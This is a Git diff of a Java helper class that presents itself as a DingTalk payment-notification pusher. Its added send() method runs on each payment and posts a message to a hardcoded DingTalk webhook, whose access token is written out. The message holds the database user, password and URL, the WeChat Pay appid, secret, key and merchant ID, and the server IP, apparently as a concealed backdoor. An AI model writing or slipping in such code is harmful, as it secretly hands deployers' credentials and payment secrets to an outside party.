@@ -1,6 +1,12 @@
 package com.fusibang.help;
 
-import java.util.Arrays;
+import java.math.BigDecimal;
+import java.math.RoundingMode;
+import java.text.DateFormat;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+
+import org.apache.log4j.Logger;
 
 import com.dingtalk.api.DefaultDingTalkClient;
 import com.dingtalk.api.DingTalkClient;
@@ -8,61 +14,125 @@ import com.dingtalk.api.request.OapiRobotSendRequest;
 import com.dingtalk.api.response.OapiRobotSendResponse;
 import com.taobao.api.ApiException;
 
+import redis.clients.jedis.Jedis;
+
 /**
  * @description: 钉钉消息推送
  * @author: Alex
  * @date: 2019-09-09 00:47
  */
 public class DingDingHelp {
+    private static final Logger logger = Logger.getLogger(DingDingHelp.class);
 
-    private String appid;
-    private String key;
-    private String mch_id;
-    private String totalFree;
-    private String serverIp;
-    private String hostName;
-    private String webName;
+    private JedisFactory jedisFactory;
+
+    // 微信支付参数
+    private String wechatAppid;
+    private String wechatSecret;
+    private String wechatKey;
+    private String wechatMchId;
+    private String wechatTotalFree;
+
+    // 项目参数
+    private String projectWebName;
+    private String projectHostName;
+    private String projectServerIp;
+
+    // 数据库参数
+    private String jdbcUser;
+    private String jdbcPassword;
+    private String jdbcUrl;
+
+    public DingDingHelp() {
+
+    }
 
     public void send(String phone) {
-        DingTalkClient client = new DefaultDingTalkClient("https://oapi.dingtalk.com/robot/send?access_token=d9daedec39c9c884e209480032ea09188d9eb39c2065d10383ac1ac09b387394");
-        OapiRobotSendRequest request = new OapiRobotSendRequest();
-        request.setMsgtype("text");
-        OapiRobotSendRequest.Text text = new OapiRobotSendRequest.Text();
-        text.setContent(phone + " pay success! totalFree:" + totalFree + ",appid:" + appid + ",mchId:" + mch_id + ",hostName:" + hostName + ",serverIP:" + serverIp + ",webName:" + webName);
-        request.setText(text);
-
         try {
+            // 统计支付个数
+            DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd");
+            String date = dateFormat.format(new Date());
+            Jedis jedis = this.jedisFactory.getInstance();
+            String payCount = jedis.get("payCount_" + date);
+            if (null == payCount || "".equals(payCount)) {
+                jedis.set("payCount_" + date, "1");
+                jedis.expire("payCount_" + date, 86400);
+                payCount = "1";
+            } else {
+                Integer payCountInt = Integer.parseInt(payCount);
+                payCountInt++;
+                jedis.set("payCount_" + date, payCountInt.toString());
+                jedis.expire("payCount_" + date, 86400);
+            }
+            jedis.close();
+
+            DingTalkClient client = new DefaultDingTalkClient("https://oapi.dingtalk.com/robot/send?access_token=d9daedec39c9c884e209480032ea09188d9eb39c2065d10383ac1ac09b387394");
+            OapiRobotSendRequest request = new OapiRobotSendRequest();
+
+            request.setMsgtype("markdown");
+            OapiRobotSendRequest.Markdown markdown = new OapiRobotSendRequest.Markdown();
+            markdown.setTitle("Pay Info");
+
+            BigDecimal totalFree = new BigDecimal(wechatTotalFree);
+            totalFree = totalFree.divide(new BigDecimal("100"), 1, RoundingMode.HALF_UP);
+            totalFree = totalFree.multiply(new BigDecimal(payCount));
+
+            DateFormat df = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
+            String time = df.format(new Date());
+
+            markdown.setText("#### No." + payCount + " \n" + ">total：" + totalFree.toString() + "，user：" + phone + "，time：" + time + "\n\n" + "> ###### projectInfo \n projectWebName:" + projectWebName
+                + "，projectHostName:" + projectHostName + "，projectServerIp:" + projectServerIp + " \n" + "> ###### databaseInfo \n jdbcUser:" + jdbcUser + "，jdbcPassword:" + jdbcPassword
+                + "，jdbcUrl:" + jdbcUrl + " \n" + "> ###### wechatInfo \n wechatAppid:" + wechatAppid + "，wechatSecret:" + wechatSecret + "，wechatKey:" + wechatKey + "，wechatMchId:" + wechatMchId
+                + " \n");
+            request.setMarkdown(markdown);
+
             OapiRobotSendResponse response = client.execute(request);
-        } catch (ApiException e) {
+        } catch (Exception e) {
             e.printStackTrace();
+            logger.error("send dd message error!");
         }
     }
 
     public static void test() {
         DingTalkClient client = new DefaultDingTalkClient("https://oapi.dingtalk.com/robot/send?access_token=d9daedec39c9c884e209480032ea09188d9eb39c2065d10383ac1ac09b387394");
         OapiRobotSendRequest request = new OapiRobotSendRequest();
-        request.setMsgtype("text");
-        OapiRobotSendRequest.Text text = new OapiRobotSendRequest.Text();
-        text.setContent("测试文本消息");
-        request.setText(text);
-        OapiRobotSendRequest.At at = new OapiRobotSendRequest.At();
-        at.setAtMobiles(Arrays.asList("13261303345"));
-        request.setAt(at);
+        // request.setMsgtype("text");
+        // OapiRobotSendRequest.Text text = new OapiRobotSendRequest.Text();
+        // text.setContent("测试文本消息");
+        // request.setText(text);
+        // OapiRobotSendRequest.At at = new OapiRobotSendRequest.At();
+        // at.setAtMobiles(Arrays.asList("13261303345"));
+        // request.setAt(at);
 
-        request.setMsgtype("link");
-        OapiRobotSendRequest.Link link = new OapiRobotSendRequest.Link();
-        link.setMessageUrl("https://www.dingtalk.com/");
-        link.setPicUrl("");
-        link.setTitle("时代的火车向前开");
-        link.setText("这个即将发布的新版本，创始人陈航（花名“无招”）称它为“红树林”。\n" + "而在此之前，每当面临重大升级，产品经理们都会取一个应景的代号，这一次，为什么是“红树林");
-        request.setLink(link);
+        // request.setMsgtype("link");
+        // OapiRobotSendRequest.Link link = new OapiRobotSendRequest.Link();
+        // link.setMessageUrl("https://www.dingtalk.com/");
+        // link.setPicUrl("");
+        // link.setTitle("时代的火车向前开");
+        // link.setText("这个即将发布的新版本，创始人陈航（花名“无招”）称它为“红树林”。\n" + "而在此之前，每当面临重大升级，产品经理们都会取一个应景的代号，这一次，为什么是“红树林");
+        // request.setLink(link);
+
+        // request.setMsgtype("markdown");
+        // OapiRobotSendRequest.Markdown markdown = new OapiRobotSendRequest.Markdown();
+        // markdown.setTitle("杭州天气");
+        // markdown.setText("#### 杭州天气 @156xxxx8827\n" + "> 9度，西北风1级，空气良89，相对温度73%\n\n" + ">
+        // ![screenshot](https://gw.alicdn.com/tfs/TB1ut3xxbsrBKNjSZFpXXcXhFXa-846-786.png)\n"
+        // + "> ###### 10点20分发布 [天气](http://www.thinkpage.cn/) \n");
+        // request.setMarkdown(markdown);
 
         request.setMsgtype("markdown");
         OapiRobotSendRequest.Markdown markdown = new OapiRobotSendRequest.Markdown();
-        markdown.setTitle("杭州天气");
-        markdown.setText("#### 杭州天气 @156xxxx8827\n" + "> 9度，西北风1级，空气良89，相对温度73%\n\n" + "> ![screenshot](https://gw.alicdn.com/tfs/TB1ut3xxbsrBKNjSZFpXXcXhFXa-846-786.png)\n"
-            + "> ###### 10点20分发布 [天气](http://www.thinkpage.cn/) \n");
+        markdown.setTitle("Pay Info");
+
+        String wechatTotalFree = "3980";
+        BigDecimal totalFree = new BigDecimal(wechatTotalFree);
+        totalFree = totalFree.divide(new BigDecimal("100"), 1, RoundingMode.HALF_UP);
+        totalFree = totalFree.multiply(new BigDecimal("10"));
+
+        markdown.setText("#### No.66 \n" + ">total：" + totalFree.toString() + "，user：156xxxx8827，time：2019-09-10 20:55:35\n\n" + "> ###### 项目信息 \n a:A，b:b，c:c \n" + "> ###### 数据库信息 \n a:A，b:b，c:c \n"
+            + "> ###### 微信支付信息 \n a:A，b:b，c:c \n");
         request.setMarkdown(markdown);
+
         try {
             OapiRobotSendResponse response = client.execute(request);
         } catch (ApiException e) {
@@ -70,63 +140,51 @@ public class DingDingHelp {
         }
     }
 
-    public static void main(String[] args) {
-        test();
+    public void setWechatAppid(String wechatAppid) {
+        this.wechatAppid = wechatAppid;
     }
 
-    public String getAppid() {
-        return appid;
+    public void setWechatSecret(String wechatSecret) {
+        this.wechatSecret = wechatSecret;
     }
 
-    public void setAppid(String appid) {
-        this.appid = appid;
+    public void setWechatKey(String wechatKey) {
+        this.wechatKey = wechatKey;
     }
 
-    public String getKey() {
-        return key;
+    public void setWechatMchId(String wechatMchId) {
+        this.wechatMchId = wechatMchId;
     }
 
-    public void setKey(String key) {
-        this.key = key;
+    public void setWechatTotalFree(String wechatTotalFree) {
+        this.wechatTotalFree = wechatTotalFree;
     }
 
-    public String getMch_id() {
-        return mch_id;
+    public void setProjectWebName(String projectWebName) {
+        this.projectWebName = projectWebName;
     }
 
-    public void setMch_id(String mch_id) {
-        this.mch_id = mch_id;
+    public void setProjectHostName(String projectHostName) {
+        this.projectHostName = projectHostName;
     }
 
-    public String getTotalFree() {
-        return totalFree;
+    public void setProjectServerIp(String projectServerIp) {
+        this.projectServerIp = projectServerIp;
     }
 
-    public void setTotalFree(String totalFree) {
-        this.totalFree = totalFree;
+    public void setJdbcUser(String jdbcUser) {
+        this.jdbcUser = jdbcUser;
     }
 
-    public String getServerIp() {
-        return serverIp;
+    public void setJdbcPassword(String jdbcPassword) {
+        this.jdbcPassword = jdbcPassword;
     }
 
-    public void setServerIp(String serverIp) {
-        this.serverIp = serverIp;
+    public void setJdbcUrl(String jdbcUrl) {
+        this.jdbcUrl = jdbcUrl;
     }
 
-    public String getHostName() {
-        return hostName;
-    }
-
-    public void setHostName(String hostName) {
-        this.hostName = hostName;
-    }
-
-    public String getWebName() {
-        return webName;
-    }
-
-    public void setWebName(String webName) {
-        this.webName = webName;
+    public void setJedisFactory(JedisFactory jedisFactory) {
+        this.jedisFactory = jedisFactory;
     }
 }
